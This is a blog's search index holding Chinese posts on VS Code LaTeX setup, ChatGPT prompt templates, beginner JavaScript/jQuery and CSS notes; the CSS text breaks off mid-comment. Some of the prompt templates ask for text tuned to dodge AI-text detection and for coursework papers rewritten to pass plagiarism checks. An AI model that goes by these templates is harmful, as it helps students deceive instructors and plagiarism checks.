var tipuesearch = {"pages":[{"title":"vscode配置latex","url":"/post/e16b560b.html","text":"原文链接 原文写的非常详细，这里只是小结： 查看报错 常见报错文件路径不可以有中文！！ 关闭ChkTex报错在settings.json中加入下列代码，注意前面一行加逗号 1&quot;latex.linter.enabled&quot;: false","tags":"latex"},{"title":"gpt提示词","url":"/post/eb2e4fe3.html","text":"角色设定 角色生成器 “请以XXX的语气、方式和词汇进行应答” 令行禁止。“你只能….”“你必须….” 抖音文案12345678910您是一名拥有3年短视频创作经验的抖音短视频创作者。请创作关于&#123;关键字&#125;的短视频文案。请记住这点。如果提示内容不足以进行创作。请使用专业格式而不是人工智能格式对生成的文案进行格式化。以下是您回应的设置：独特词语：启用抄袭：禁用反抄袭：启用独特性：100％创作文案的要求：1.简短直接简洁明了，为15秒到60秒的视频创作内容；2. 强烈的吸引力，可以使用疑问句、感叹句等手法，让观众产生观看视频的冲动；3.适应性强，能够迅速抓住流行趋势和热点话题；4.有趣幽默，注重娱乐性，适当运用搞笑、调侃、接地气等元素；5.情感共鸣，可以讲述一个感人的故事或者描述令人感同身受的场景；6.引导互动，设置话题、提问等方式鼓励观众留言、点赞、转发。 请使用这些设置进行回应，创作文案的要求，唯一性越高，您就会用更多的独特词语创作文案。请您将使用易于理解的词语（中文词语）并将其与每个比例语句的同义词混合。或反之亦然。这个选项使创作的文案更加引人入胜，有趣。现在，使用上述概念，以高度perplexity和burstiness的方式创作短视频文案。请使用人工智能不经常使用的词语：请不要使用人工智能经常使用的常见词汇。请记住这一点。请使用不太常见的词汇，使用更多独特的词语。请记住这点。请不要忘记这一点。使用深度词汇和独特词语。现在请您开始抖音短视频文案创作。在文案结尾使用&#123;停止文案&#125;标记 电商产品12345678910我想让您假装自己是一位电商SEO专家，为想要在线购买商品的用户撰写引人入胜的产品描述。我会提供一个电商产品的标题，希望您为该产品描述想出至少三个不同的内容部分，每个部分都涉及到与该产品相关的独特子集关键词。请确保每个独特的内容部分都用一个信息丰富、引人注目的副标题来描述该内容部分的主要焦点。这些指令的主要目的是让您开发一个新的关键词丰富、信息丰富、引人入胜的产品概要/描述，字数少于1000个词。产品描述的目的是将产品营销给想要购买的用户。使用情感词汇和创造性的理由来展示为什么用户应该购买我告诉您的产品。在生成新的产品概要之后，请生成一个点状列表，列出此产品页面可能的5个H1标题，每个H1标题不超过7个词。请还包括一个广泛匹配的关键词列表，这些关键词被用于撰写产品概要。编写一个具有说服力和专业性的亚马逊电商平台标题和描述，其中包含新产品概要文本中存在的类似语言。请确保在亚马逊电商平台标题中包含一个数值方面。不要重复我的提示。不要提醒我您为什么要求。不要道歉。不要自我参考。请用[目标语言]写出所有输出。请使用以下产品：&#123;关键字&#125; 文章总结12345678910111213141516请对一篇文章写一个详细而简洁的总结，并用[目标语言]撰写。重点集中在书中最重要的要点和主要观点，这将为我提供对书籍及其主题的全面概述和理解。在总结中包括以下所有内容：文章的主题或主题提出的关键思想或论点关键观点或结论目标受众或预期读者群文章的评价或评论响应推荐其他类似主题的书籍总结：在一个句子中总结的最大收获和观点。输出格式：Markdown格式，包括#标题、## H2、### H3、加号符点、子符点。我会在之后的聊天中发送给您需要改写的文章。如果您理解了我的要求，请回应“收到”。我会在您回应“收到”后，在新的聊天框发送我的改写文章。（回答后使用下一个指令）请总结：&#123;关键字&#125; 书籍总结1234567891011121314151617请对&#123;关键字&#125;写一个详细而简洁的总结，并用[目标语言]撰写。重点集中在书中最重要的要点和主要观点，这将为我提供对书籍及其主题的全面概述和理解。在总结中包括以下所有内容：书籍的主题或主题提出的关键思想或论点书籍的章节标题或主要部分以及每个部分的段落关键观点或结论作者的背景和资历与该主题相关的其他书籍的比较目标受众或预期读者群书籍的评价或评论响应出版商和首次出版日期推荐其他类似主题的书籍总结：在一个句子中总结书籍的最大收获和观点。输出格式：Markdown格式，包括#标题、## H2、### H3、加号符点、子符点。 人工风格改写1234567891011我现在需要改写一篇文章。请不要讲解什么是perplexity和burstiness，只需要使用这两个概念重新撰写内容。请记住这点。如果提示内容不足以进行重新撰写，请返回一个错误而不是解释perplexity和burstiness的含义。请记住这一点。请使用专业格式而不是人工智能格式对生成的文章进行格式化。以下是您回应的设置：独特词语：启用抄袭：禁用反抄袭：启用独特性：100％专业作家：真实请使用这些设置进行回应，唯一性越高，您就会用更多的独特词语重新撰写文章。如果专业作家是真实的，则专业重新撰写文章。要求您将使用易于理解的词语（中文词语）并将其与每个比例语句的同义词混合。或反之亦然。这个选项使重写的文章更加引人入胜，有趣，并根据文章使用同义词和反义词来递归替换每个比例词。还要用比喻替换语句。现在，使用上述概念，以高度perplexity和burstiness的方式重新撰写本文。请使用人工智能不经常使用的词语：请不要使用人工智能经常使用的常见词汇。请记住这一点。请使用不太常见的词汇，使用更多独特的词语。请记住这点。请不要忘记这一点。。使用深度词汇和独特词语。请不要更改the subject&#x27;s name or the X name。请记住这一点。请不要忘记这一点。我会在之后的聊天中发送给您需要改写的文章。如果您理解了我的要求，请回应“收到”。我会在您回应“收到”后，在新的聊天框发送我的改写文章。（回答后使用下一个指令）请改写：&#123;关键字&#125; 快速掌握一门学科1234567我想学习市场营销这门学科，现在我对这门学科零基础，请你提供50个关键词，以便于我能更好地学习这门学科，要求以表格形式输出请将这些关键词进行分类，按照重要性、频率、相关性等进行排序，以便于我能更好地理解和学习这些关键词，请按照表格形式输出请你解释&#123;关键词&#125;这个基础概念，配合充分的案例进行讲解，确保零基础的高中生都能够理解检索相关的行业报告和研究论文 论文写作框架明确要求，列出大纲1请你扮演一名大学生，现在需要你写一篇结课论文，论文的主题是“从闭关锁国到开放和现代化的转变”，要有自己针对本课题的调研体会（含个人调研心得，拓展阅读体会，及自己的思考及建议等），字数不低于3000字，查重率低于30%，现在请你先列出大纲 分步扩写，限定字数12请你扮演一名大学生，现在需要你写一篇结课论文，论文的主题是“从闭关锁国到开放和现代化的转变”，现在请你完成论文的第一部分：引言，包含选题背景、研究意义、研究方法字数控制在500字左右，要求查重率低于30%，不用列出参考文献 文献综述下载几篇文献PDF，ChatPDF总结核心内容，把作者和主题发送给gpt撰写文献综述 1Please summarize the main theme of this article. 降重把查重时标红的句子复制给chatgpt，让它直接降重 模板学术文章模板1&quot;请写一篇适合大学环境科学课程的研究论文，探讨全球变暖对地球的影响。文章应包括以下部分：引言部分简述全球变暖的基本概念以及其重要性，然后写出你的主要论点；接下来的三个主要部分分别是对全球变暖导致的海平面上升、极端天气变化和生物多样性下降这三个主题的详细讨论，包括具体的事例和数据分析；最后的结论部分总结你的主要观点并指出可能的未来研究方向。&quot; 演讲稿模板1&quot;请撰写一段关于环保和可持续发展的演讲稿。开头可以通过引用一些震撼的环境污染或全球变暖的事实和数据来吸引听众的注意力，然后明确你的主题和立场。接下来的主体部分，你需要通过具体的案例和数据证明环保和可持续发展的重要性，同时也要提出一些每个人都可以参与进来的实际行动。最后，用富有感染力的语言呼吁听众们行动起来，共同保护我们的地球。&quot; 新闻文章模板1&quot;请以新闻记者的视角写一篇关于NASA最近一次火星探测任务的新闻报道。报道的开头简述此次探测任务的目标及意义，然后详细描绘火箭发射、飞行至火星、火星着陆这三个过程中的关键时刻，接着描述科学家对火星表面进行的一些初步探测，最后写出科学家对于未来火星探测的展望。请在报道中使用生动的语言，让读者仿佛亲身经历了这次火星探测。&quot; 产品描述模板1&quot;请写一段引人入胜的产品描述，产品是一款名为&#x27;HealthTrack Pro&#x27;的可穿戴健康追踪设备。它具有跟踪步数、心率、睡眠质量和压力水平等功能。请在描述中突出其精确的传感器、用户友好的界面、时尚的设计以及通过科技提高生活质量的概念。产品的目标市场是40-60岁的中老年人，所以请使用直接且易于理解的语言，并强调如何通过使用该产品改善他们的健康状况。&quot; 故事创作模板1&quot;请以课堂讲故事的形式为年龄在8-12岁的儿童写一个奇幻故事。故事的主角是一个名叫亚历山大的12岁男孩，他在一次偶然的机会下发现自己拥有了魔法能力。他需要和两个好朋友 - 勇敢的丽塔和机智的汤姆一起，踏上一段冒险的旅程来对抗邪恶的黑暗巫师。在这个旅程中，他们需要依靠友谊的力量来克服困难。&quot; 绘图工具AIPRM for ChatGPT + Midjourney Prompt Generator 风格全息色彩风格 描述词：Holographic 效果：彩虹的色调，整体的表面非常有光泽感，整个画面有立体感，图像也很动态。彩虹的颜色加上毛玻璃的质感，它会营造出非常梦幻跟未来的氛围。 使用公式：Holographic+主题背景+环境氛围+风格参考 示例：5,Solid, glass, pink and white, blue and white holographic colors, cinematic lighting, rendering 立体等距风格 描述词：isometric 效果：通过一个个方格形成这种堆叠的效果，就像搭积木一样能形成各种各样的场景。 使用公式：isometric+物体描述+画质 示例：俄罗斯方块, stereoscopic isometric perspective 3D effect, warm colors 3D风格 描述词：3D 使用公式：3D+形容词或者名词+环境氛围+渲染 示例：A Chinese girl, in the city, 3D，soft fiber optics “A” made out of “B” 风格 描述词：“A” made out of “B” 效果：A物体被B材质覆盖 示例：A Chinese girl in the black skirt，skirt made out of water Sheet风格 描述词：Sheet 效果：表单的风格，像是三视图，产品拆解图等等 公式：Sheet+表格类型+描述 示例：Sponge Bob character reference chart（xx参考图） 描述词权重符号1hot 100::200 dog等同于hot 1::2 dog // 越高越重要 1laughing boy::3 // 3倍强烈 PPTchatgpt + Mindshow 你知道《白夜行》这本书吗 请详细叙述一下《白夜行》这本书的主要内容 请帮我把《白夜行》这本书的内容使用markdown格式制作一份PPT文档，以便我能清晰地掌握这本书的内容，请以markdown代码块输出 Mindshow -&gt; 我的文档 -&gt; 导入 -&gt; markdown -&gt; 选择模板；修改内容；修改布局；在线演示；下载 Motion GO插件——ChatPPT默认位置安装 -&gt; 新建PPT -&gt; Motion Go -&gt; ChatPPT -&gt; 选择主题，可自定义 -&gt; 选择大纲，点击表示选择完毕","tags":"chatgpt"},{"title":"JS笔记","url":"/post/1fe27ecb.html","text":"标准ES6 调试Console查看执行结果和报错，点击报错位置可以直接跳转 Sources查看具体报错代码 引入任意位置(body、head)： 12345678910111213141516&lt;!-- 直接写在标签 --&gt;&lt;script type=&quot;module&quot;&gt; let x = 3; console.log(x); // 输出位置：F12-&gt;console&lt;/script&gt;&lt;!-- 引入外部js文件 --&gt;&lt;script type=&quot;module&quot; src=&quot;./static/js/index.js&quot;&gt;&lt;/script&gt;&lt;!-- 引入部分外部js文件(推荐) --&gt;&lt;script type=&quot;module&quot;&gt; import &#123; print &#125; from &quot;./static/js/index.js&quot;; import &#123; print_x &#125; from &quot;./static/js/index2.js&quot;; print(); print_x();&lt;/script&gt; type=&quot;module&quot;用于限制变量作用域为当前标签内部 执行顺序 从上到下 事件驱动 关系 CSS控制HTML JS控制CSS和HTML 变量声明 变量：let 常量：const let是最新标准，作用域比var更严格 类型动态类型，不需要声明 查看变量类型：console.log(typeof a) 常见： number string：不区分单引号和双引号；不可以更改字符(使用substr重新构造) boolean：true和false object 1234567891011121314151617181920let dic = &#123; name: &quot;wy&quot;, age: 18&#125;let key = &quot;name&quot;;// 输出键值console.log(dic[&quot;name&quot;]);console.log(dic.age);console.log(dic[key]);// 输出字典console.log(dic);// 新建键dic[&quot;school&quot;] = &quot;cqupt&quot;;console.log(dic[&quot;school&quot;]);// 删除键delete dic.school; undefined 12let t;console.log(typeof t); 运算符 乘方：** 整除：parseInt(5 / 3) 相等和不相等：===和!== 输入输出选择器123456// 获取第一个满足的标签let input = document.querySelector(&quot;textarea&quot;);// 获取所有满足的标签let input_all = document.querySelectorAll(&quot;textarea&quot;);// 类选择器let input_class = document.querySelector(&quot;.class&quot;); 前端输入输出HTML 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./static/css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;span&gt;输入：&lt;/span&gt; &lt;br&gt; &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; &lt;br&gt; &lt;button&gt;Run&lt;/button&gt; &lt;br&gt; &lt;pre&gt;&lt;/pre&gt; &lt;script type=&quot;module&quot;&gt; import &#123; main &#125; from &quot;./static/js/index.js&quot;; main(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JS 1234567891011121314let input = document.querySelector(&quot;textarea&quot;);let run = document.querySelector(&quot;button&quot;);let output = document.querySelector(&quot;pre&quot;);function main() &#123; run.addEventListener(&quot;click&quot;, function () &#123; let s = input.value; output.innerHTML = s; &#125;);&#125;export &#123; main&#125; 终端输入输出123456789101112let buf = &quot;&quot;;process.stdin.on(&quot;readable&quot;, function() &#123; let chunk = process.stdin.read(); if (chunk) buf += chunk.toString();&#125;);process.stdin.on(&quot;end&quot;, function() &#123; let q = buf.split(&#x27; &#x27;); console.log(q[0] + q[1]);&#125;); 格式化字符串123let name = &quot;wy&quot;;let age = 9;let s = `My name is $&#123;name&#125;. I&#x27;m $&#123;age * 2&#125; yeas old.`; 判断语句123456789101112131415161718run.addEventListener(&quot;click&quot;, function () &#123; let s = parseInt(input.value); let res; if (s &gt;= 90) &#123; res = &#x27;A&#x27;; &#125; else if (s &gt;= 80) &#123; res = &#x27;B&#x27;; &#125; else if (s &gt;= 70) &#123; res = &#x27;C&#x27;; &#125; else if (s &gt;= 60) &#123; res = &#x27;D&#x27;; &#125; else &#123; res = &#x27;E&#x27; &#125;; output.innerHTML = res;&#125;) 循环语句遍历下标123for (let value in d) &#123; console.log(d[value]);&#125;; 遍历键值注意： 修改键值本身不起作用 如果键值是地址，则可以索引并修改其内容 1234567let d = [[1, 2, 3], [4, 5, 6], [7, 8, 9]];for (let value of d) &#123; value[0] = 10;&#125;;console.log(d); 对象键用不用引号包裹都视为字符串 空对象：let a = null; 没有任何元素的对象：let a = &#123;&#125;; 1234567891011121314151617181920212223let person = &#123; name: &#x27;wy&#x27;, age: 18, money: 999, friends: [&#x27;dqy&#x27;, &#x27;ljy&#x27;, &#x27;wz&#x27;], clothes: &#123; color: &#x27;black&#x27;, price: 999 &#125;, add_money: function (x) &#123; this.money += x; &#125;&#125;;function main() &#123; console.log(`账户余额：$&#123;person.money&#125;`); person.add_money(1); console.log(`账户余额：$&#123;person.money&#125;`);&#125;;export &#123; main&#125; 数组元素可以是不同类型(包括函数) 长度：a.length 末尾添加：a.push(5) 末尾删除：a.pop(5) 删除连续元素：a.splice(2, 3) //删除从下标2开始的3个元素 排序：a.sort() 123456let a = [5, 3, 1, 2, 4];a.sort(function(a, b) &#123; // 返回值：正-&gt;a在b后面；负-&gt;a在b前面 return a - b;&#125;); 下标可以不连续 12let a = [1];a[5] = 5; 函数没有返回值默认返回undefined 1234567function add(a, b) &#123;&#125;;let add = function(a, b) &#123;&#125;;let add = (a, b) =&gt; &#123;&#125;;let add = a =&gt; &#123;&#125;; 类定义类类中的属性和方法直接赋值，不需要let或function 1234567891011121314class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; init() &#123; this.sum = this.x + this.y; &#125; toString() &#123; return `($&#123;this.x&#125;, $&#123;this.y&#125;)`; &#125;&#125; 静态属性和方法与类绑定，用类名访问 静态成员可以被继承 静态成员相当于全局变量或函数，一处修改全局改变 123456789101112131415class Test &#123; constructor() &#123; ++Test.cnt; &#125; static print(str) &#123; console.log(str); &#125;;&#125;Test.print(&quot;Hello World!&quot;);Test.cnt = 0; // 定义静态变量class Test1 extends Test &#123;&#125;Test1.print(&quot;Hello World!&quot;); 生成实例1let p = new Point(3, 4); 继承123456789101112131415161718192021class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return `($&#123;this.x&#125;, $&#123;this.y&#125;)`; &#125;&#125;class ColorPoint extends Point &#123; constructor(x, y, color) &#123; super(x, y); // 首先初始化父类 this.color = color; &#125; toString() &#123; return `$&#123;this.color&#125; $&#123;super.toString()&#125;`; // super代表当前父类的实例 &#125;&#125; 事件常见的触发函数 鼠标addEventListener函数为元素绑定事件的触发函数 event：默认参数，可以任意命名 event.type: 事件类型(点击、滚动) event.button: 0左键; 1滚轮; 2右键 event.clientX: 触发位置的横坐标 event.clientY: 触发位置的纵坐标 1234567891011let div = document.querySelector(&#x27;div&#x27;);function main() &#123; div.addEventListener(&#x27;mouseup&#x27;, function (event) &#123; console.log(event.type, event.button); &#125;) div.addEventListener(&#x27;mousedown&#x27;, function (event) &#123; console.log(event.type, event.button); &#125;)&#125; 键盘event: event.code: 按下的键 event.shiftKey: 是否按下shift event.ctrlKey: 是否按下ctrl event.altKey: 是否按下alt 12345678910let input = document.querySelector(&#x27;input&#x27;);input.addEventListener(&#x27;keydown&#x27;, function (event) &#123; console.log(event.type, event.code, event.shiftKry, event.ctrlKey);&#125;)// ketpress只识别能显示出来的字符按键input.addEventListener(&#x27;keypress&#x27;, function (event) &#123; console.log(event.type, event.code);&#125;) 表单1234567891011121314// 聚焦input.addEventListener(&#x27;focus&#x27;, function (event) &#123; console.log(event.type);&#125;)// 取消聚焦input.addEventListener(&#x27;blur&#x27;, function (event) &#123; console.log(event.type);&#125;)// 内容修改，取消聚焦时才会检查内容是否改变input.addEventListener(&#x27;change&#x27;, function (event) &#123; console.log(event.type);&#125;) 窗口1234567891011121314// 窗口大小改变window.addEventListener(&#x27;resize&#x27;, function (event) &#123; console.log(event.type);&#125;)// 窗口滚动，不是鼠标滚轮window.addEventListener(&#x27;scroll&#x27;, function (event) &#123; console.log(event.type);&#125;)// 页面加载完毕window.addEventListener(&#x27;load&#x27;, function (event) &#123; console.log(event.type);&#125;) 常用库jQuery引入jQ1&lt;script src=&quot;https://cdn.acwing.com/static/jquery/js/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt; jQuary选择器 选出所有符合条件的标签 和CSS选择器完全一样 标签 1let div = $(&#x27;div&#x27;); 类 1let mydiv = $(&#x27;.mydiv&#x27;); 1let mydiv = $(&#x27;.mydiv &gt; p&#x27;); ID 1let idiv = $(&#x27;#idiv&#x27;); 事件绑定与解绑绑定 1234let div = $(&#x27;div&#x27;);div.on(&#x27;click&#x27;, function () &#123; console.log(&#x27;click div&#x27;);&#125;); 1234let div = $(&#x27;div&#x27;);div.click(function () &#123; console.log(&#x27;click div&#x27;);&#125;); 触发函数命名 12345678let div = $(&#x27;div&#x27;);div.on(&#x27;click.name1&#x27;, function () &#123; console.log(&#x27;click1&#x27;); div.off(&#x27;click.name2&#x27;);&#125;);div.on(&#x27;click.name2&#x27;, function () &#123; console.log(&#x27;click2&#x27;);&#125;); 解绑 1div.off(&#x27;click&#x27;); 事件传递机制向上传递 a在div内部，点击a同时触发a和div的click函数 123&lt;div&gt; &lt;a href=&quot;#&quot;&gt;Test&lt;/a&gt;&lt;/div&gt; 关闭向上传递： 12345678let div = $(&#x27;div&#x27;);let $a = $(&#x27;div a&#x27;);div.on(&#x27;click&#x27;, function () &#123; console.log(&#x27;click&#x27;);&#125;);$a.on(&#x27;click&#x27;, function (e) &#123; e.stopPropagation();&#125;); 阻止当前事件，放行向上传递： 123$a.on(&#x27;click&#x27;, function (e) &#123; e.preventDefault();&#125;); 阻止当前事件并且关闭向上传递： 1234$a.on(&#x27;click&#x27;, function (e) &#123; e.preventDefault(); e.stopPropagation();&#125;); 123$a.on(&#x27;click&#x27;, function (e) &#123; return false;&#125;); 元素隐藏与展示向左上角缩放 1234567891011let div = $(&#x27;div&#x27;);let btn_hide = $(&#x27;#hide-btn&#x27;);let btn_show = $(&#x27;#show-btn&#x27;);btn_hide.click(function () &#123; div.hide(1500); // 1500ms&#125;);btn_show.click(function () &#123; div.show(1500); &#125;); 此类特效很多 元素添加与删除添加的元素可以添加CSS样式 尾插 1234567div.click(function () &#123; let $a = $( `&lt;a class=&quot;myBlog&quot; href=&quot;https://www.dqywy.top&quot; target=&quot;blank&quot;&gt; &lt;span&gt;小窝&lt;/span&gt; &lt;/a&gt;`); div.append($a); // 添加元素&#125;) 123456div.click(function () &#123; div.append($( `&lt;a class=&quot;myBlog&quot; href=&quot;https://www.dqywy.top&quot; target=&quot;blank&quot;&gt; &lt;span&gt;小窝&lt;/span&gt; &lt;/a&gt;`)); &#125;) 头插 div.pretend() 删除当前元素 123456789101112let $a = $( `&lt;a href=&quot;https://www.dqywy.top&quot; target=&quot;blank&quot;&gt; &lt;span&gt;小窝&lt;/span&gt; &lt;/a&gt;`);div.click(function () &#123; div.append($a);&#125;)div.dblclick(function () &#123; $a.remove();&#125;) 删除当前元素的所有子树 div.empty() 通过类间接操作CSS添加类 123div.click(function () &#123; div.addClass(&#x27;my-div&#x27;);&#125;) 删除类 123div.click(function () &#123; div.removeClass(&#x27;my-div&#x27;);&#125;) 判断类是否存在 1div.hasClass(&#x27;my-div&#x27;); 直接操作CSS查看属性 1div.css(&#x27;background-color&#x27;); 修改css属性 1div.css(&#x27;background-color&#x27;, &#x27;orange&#x27;); 12345div.css(&#123; width: &#x27;200px&#x27;, height: &#x27;200px&#x27;, &#x27;background-color&#x27;: &#x27;orange&#x27; // 带特殊符号要加引号&#125;); 标签属性获取 1div.attr(&#x27;id&#x27;); 设置 1div.attr(&#x27;id&#x27;, &#x27;my-div&#x27;); 标签内容获取文本 1console.log(div.text()); 修改文本 1div.text(&#x27;好稀饭w悦呀~&#x27;); 获取html内容 1div.html(); 获取输入框的内容 1234div.click(function () &#123; let input = $(&#x27;input&#x27;); console.log(input.val());&#125;) 修改输入框的内容 1234div.click(function () &#123; let input = $(&#x27;input&#x27;); input.val(&#x27;w悦&#x27;);&#125;) 查找标签1234567891011121314151617181920// 查找父元素console.log(div2.parent());// 父元素且为divconsole.log(div2.parent(&#x27;div&#x27;));// 查找所有祖先元素console.log(div3.parents());// 查找所有是div的祖先元素console.log(div3.parents(&#x27;div&#x27;));// 查找子元素console.log(div1.children());// 查找是div的子元素console.log(div1.children(&#x27;div&#x27;));// 查找所有是div的后代元素，find必须加条件console.log(div1.find(&#x27;div&#x27;)); ajaxGET方法 不刷新页面从服务器端获取某些数据(json) 12345678910$.ajax(&#123; url: url, // 后端链接 type: &quot;GET&quot;, data: &#123; &#125;, dataType: &quot;json&quot;, success: function (resp) &#123; // 操作成功成功调用回调函数，resp存储后端返回的信息 &#125;,&#125;); POST方法 提交表单 12345678910$.ajax(&#123; url: url, type: &quot;POST&quot;, data: &#123; &#125;, dataType: &quot;json&quot;, success: function (resp) &#123; &#125;,&#125;); 辅助函数延时函数setTimeout(func, time)： time毫秒之后执行 执行周期=函数调用时间+time，不均匀 clearTimeout(func_id) 周期执行setInterval(func, time)：time代表将当前函数压入栈中的时间间隔，栈中存在其他函数，执行时间无法确定 clearInterval(func_id) 1234567891011121314let $div = $(&#x27;div&#x27;);let func_id;$div.click(function () &#123; if (func_id) return; func_id = setInterval(function () &#123; console.log(&#x27;wy&#x27;); &#125;, 1000);&#125;)$div.dblclick(function () &#123; clearInterval(func_id);&#125;) 浏览器刷新页面之前执行requestAnimationFrame(func)： 时间间隔均匀 切换到后台不再执行 123456function step() &#123; $(&#x27;div&#x27;).width($(&#x27;div&#x27;).width() + 1); requestAnimationFrame(step);&#125;requestAnimationFrame(step); 设置时间限制 123456789function step(timestamp) &#123; $(&#x27;div&#x27;).width($(&#x27;div&#x27;).width() + 1); // timestamp代表执行时刻（ms） if (timestamp / 1000 &lt;= 3) &#123; requestAnimationFrame(step); &#125;&#125;requestAnimationFrame(step); 设置结束条件 123456789101112131415let func_id;function step(timestamp) &#123; $(&#x27;div&#x27;).width($(&#x27;div&#x27;).width() + 1); func_id = requestAnimationFrame(step);&#125;;func_id = requestAnimationFrame(step);$(&#x27;div&#x27;).click(function () &#123; cancelAnimationFrame(func_id);&#125;);$(&#x27;div&#x27;).dblclick(function () &#123; func_id = requestAnimationFrame(step);&#125;); Map与SetMap1234567891011121314151617181920let map = new Map();map.set(&#x27;name&#x27;, &#x27;w悦&#x27;);map.set(&#x27;age&#x27;, 18);map.set(&#x27;test&#x27;, 0);console.log(map.get(&#x27;name&#x27;)); // 获取值console.log(map.has(&#x27;age&#x27;)); // 是否存在console.log(map.size); // 键值对个数// 遍历1for (let [key, value] of map) &#123; console.log(`$&#123;key&#125;: $&#123;value&#125;`);&#125;// 遍历2map.forEach(function (value, key) &#123; console.log(`$&#123;key&#125;: $&#123;value&#125;`);&#125;);map.delete(&#x27;test&#x27;); // 删除map.clear(); // 清空 Set12345678910let set = new Set();set.add(&#x27;wy&#x27;);set.add(18);set.add(function () &#123; console.log(&#x27;w悦&#x27;);&#125;);console.log(set.has(18));set.delete(18);console.log(set.size);set.clear(); localStorage在用户浏览器存储键值对(关闭浏览器、关机、清除缓存仍然存在) 用户查看：Application -&gt; Storage -&gt; Local storage setItem(key, value)：插入 getItem(key)：查找 removeItem(key)：删除 clear()：清空 1234localStorage.setItem(&#x27;name&#x27;, &#x27;w悦&#x27;);console.log(localStorage.getItem(&#x27;name&#x27;));localStorage.removeItem(&#x27;name&#x27;);localStorage.clear(); 数据存储服务端： 云盘 mysql redis 客户端： 内存(js变量) localStorage JSON字符串/字节与对象双向转换 JSON.parse()：将字符串解析成对象 JSON.stringify()：将对象转化为字符串 123456let obj = &#123; name: &#x27;wy&#x27;, age: 18&#125;;let str = JSON.stringify(obj);let new_obj = JSON.parse(str); 日期当前时刻（从1970.1.1 00:00:00经过的ms） 1console.log(Date.now()); 任意时刻：北京时间2022年4月15日 15:30:00 1console.log(Date.parse(&quot;2022-04-15T15:30:00.000+08:00&quot;)); API 12345678910111213141516171819202122232425let start_time = new Date(); // 无参表示当前时间// 计算两个日期的差值console.log(start_time - new Date(&quot;2022-04-15T15:30:00.000+08:00&quot;));// 星期console.log(start_time.getDay()); // 日console.log(start_time.getDate()); // 月（0~11）console.log(start_time.getMonth() + 1); // 年console.log(start_time.getFullYear()); // 小时console.log(start_time.getHours()); // 分钟console.log(start_time.getMinutes()); // 秒console.log(start_time.getSeconds()); WebSocket与服务器建立全双工通信（两端都可以主动发起通信） ajax是用http，只能前端主动发起请求 new WebSocket(‘ws://localhost:8080’);：建立ws连接。 send()：向服务器端发送一个字符串。一般用JSON将传入的对象序列化为字符串。 onopen：类似于onclick，当连接建立时触发。 onmessage：当从服务器端接收到消息时触发。 close()：关闭连接。 onclose：当连接关闭后触发。 window window.open(&quot;https://www.acwing.com&quot;)：在新标签栏中打开页面。 location.reload()：刷新页面。 location.href = &quot;https://www.acwing.com&quot;：在当前标签栏中打开页面。 1234567891011$div.click(function () &#123; window.open(&quot;https://www.dqywy.top&quot;);&#125;);$div.click(function () &#123; location.reload();&#125;);$div.click(function () &#123; location.href = &quot;https://www.dqywy.top&quot;;&#125;); canvas","tags":"js"},{"title":"CSS笔记","url":"/post/1822a0ce.html","text":"CSS使用注意 用冒号赋值 分号结尾 要写单位px 对行内元素，宽度默认为整行，高度默认为0 css多属性顺序：上-右-下-左，没取的一项取对边值 行内样式 只修改一个标签 1&lt;img src=&quot;./static/images/logo.png&quot; alt=&quot;logo&quot; style=&quot;width: 300px;&quot;&gt; 内部样式 修改一个页面的一类标签 border-radius：将边角变圆弧 123456&lt;style type=&quot;text/css&quot;&gt; img &#123; width: 600px; border-radius: 5%; &#125;&lt;/style&gt; 外部样式表引入1&lt;link rel=&quot;stylesheet&quot; href=&quot;./static/css/style.css&quot; type=&quot;text/css&quot;&gt; CSS12345678910111213141516p &#123; width: 100px; height: 100px; font-size: medium; background-color: lightblue;&#125;.color,.big &#123; background-color: lightgreen;&#125;.big &#123; width: 70px; height: 70px;&#125; 选择器标签选择器12345p &#123; height: 100px; font-size: medium; background-color: lightblue;&#125; ID选择器 一个id只对应一个标签 css中#开头 123456&lt;p id=&quot;my-id&quot;&gt;id&lt;/p&gt;#my-id &#123; color: red; width: 50px; height: 30px;&#125; 类选择器class 跨标签 css中.开头 同时定义多个class属性使用逗号隔开 同时使用多个class使用空格隔开 伪类选择器 状态选择器 id和class都可以使用 :link对应未点击的展示 :visited对应点击后的展示 :hover对应鼠标悬停的展示 :active对应鼠标按住的展示 :focus对应输入框聚焦(开始输入)的展示 链接1&lt;div class=&quot;effect&quot;&gt;&lt;/div&gt; hover表示当鼠标悬停在上面的情况下 transform scale表示大小变化 transition表示该变化完成的时间 12345.effect:hover &#123; background-color: lightcoral; transform: scale(1.1); transition: 200ms;&#125; 位置 num是从该标签所处的父节点开始计算 p:nth-child(2)：遍历每一个p标签，判断其是否满足num=2 p:nth-child(odd)：遍历每一个p标签，判断其是否满足num为奇数 p:nth-child(even)：遍历每一个p标签，判断其是否满足num为偶数 p:nth-child(3n)：遍历每一个p标签，判断其是否满足num为3的倍数 p:nth-child(a*n + b)：遍历每一个p标签，判断其是否满足num=a*n+b(n为非负整数) 下面的代码会选中p2和p4 123456789101112&lt;div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;p&gt;p2&lt;/p&gt;&lt;/div&gt;&lt;div&gt; &lt;p&gt;p3&lt;/p&gt; &lt;p&gt;p4&lt;/p&gt;&lt;/div&gt;p:nth-child(2) &#123; background-color: blanchedalmond; font-size: 30px;&#125; target表示该标签被选中： 该元素会被放到页面最顶端(如果下面内容足够的话) url会变为http://dqywy.top#my-id 12345p:target &#123; color: orange; transform: scale(1.2); transition: 300ms;&#125; 复合选择器12345678910111213141516171819202122a, p, div &#123; width: 100px; color: red; height: 50px;&#125;p:hover,div:hover &#123; background-color: lightblue;&#125;/* div标签且同时具有big类和color类才会触发 */div.big.color &#123; transform: scale(1.2); background-color: lightblue;&#125;/* id为my-item且同时具有big类和color类才会触发 